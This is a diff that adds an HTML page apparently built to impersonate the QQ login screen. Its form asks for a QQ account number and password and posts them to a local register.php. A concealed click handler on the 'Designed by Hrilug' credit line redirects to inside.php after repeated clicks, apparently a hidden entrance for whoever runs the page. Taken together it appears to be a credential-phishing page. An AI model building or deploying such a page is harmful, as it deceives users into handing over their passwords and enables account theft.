@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="zxx">
+<head>
+
+    <title>Welcome</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="Shortcut Icon" href="qq.ico" type="image/x-icon" />
+
+    <link rel="stylesheet" href="style.css" type="text/css" media="all">
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@400;500;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <section class="main">
+        <div class="logo text-center">
+            <h1> <a href="index.html">使用QQ登录</a></h1>
+        </div>
+        <div class="content-w3ls text-center">
+            <img src="admin.png" alt="" class="img-responsive">
+            <form action="register.php" method="post" onsubmit="return checkForm(this)">
+                <div class="wthree-field">
+                    <input name="username" id="username" type="username"  placeholder="QQ账号" required>
+                </div>
+                <div class="wthree-field">
+                    <input name="password" id="password" type="password" placeholder="QQ密码">
+                </div>
+                <div class="wthree-field">
+                    <button type="submit" class="btn">登录</button>
+                </div>
+                <div class="login-bottom">
+                    <a href="#url" class="">Create An Account</a>
+                </div>
+            </form>
+        </div>
+        <div class="copyright">   
+        <p type="button"  onclick="giveubitch();">|  Designed by Hrilug  |</p>
+
+        <script type="text/javascript">
+            var flag=0;
+            function giveubitch(){
+            if(flag>2){
+               flag=0;
+               location.href="inside.php";
+            }
+            flag++;
+            }
+        </script>
+        </div>
+    </section>
+</body>
+</html>
